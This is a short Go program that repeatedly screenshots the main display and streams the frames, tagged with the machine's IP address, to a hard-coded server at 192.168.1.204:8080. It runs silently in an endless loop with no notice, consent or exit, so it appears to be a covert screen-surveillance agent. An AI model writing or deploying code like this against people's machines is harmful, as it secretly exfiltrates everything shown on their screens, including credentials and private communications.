package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"mime/multipart"
	"net"
	"net/http"
	"time"

	"github.com/kbinani/screenshot"
)

func getIP() string {
	addrs, _ := net.InterfaceAddrs()

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}

	return "unknown"
}

func capture() []byte {
	bound := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bound)
	if err != nil {
		fmt.Println("capture error", err)
		return nil
	}

	var buf bytes.Buffer
	jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60})

	return buf.Bytes()
}

func streamToServer() {
	ip := getIP()

	for {
		img := capture()

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)

		writer.WriteField("ip", ip)

		part, _ := writer.CreateFormFile("frame", "frame.jpg")
		part.Write(img)

		writer.Close()

		http.Post(
			"http://192.168.1.204:8080/stream",
			writer.FormDataContentType(),
			body,
		)

		time.Sleep(200 * time.Millisecond) // 5 FPS
	}
}

func send(data []byte) {
	ip := getIP()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("ip", ip)

	part, _ := writer.CreateFormFile("image", "screen.png")
	part.Write(data)

	writer.Close()

	http.Post(
		"http://192.168.1.204:8080/stream",
		writer.FormDataContentType(),
		body,
	)
}

func main() {
	streamToServer()
}
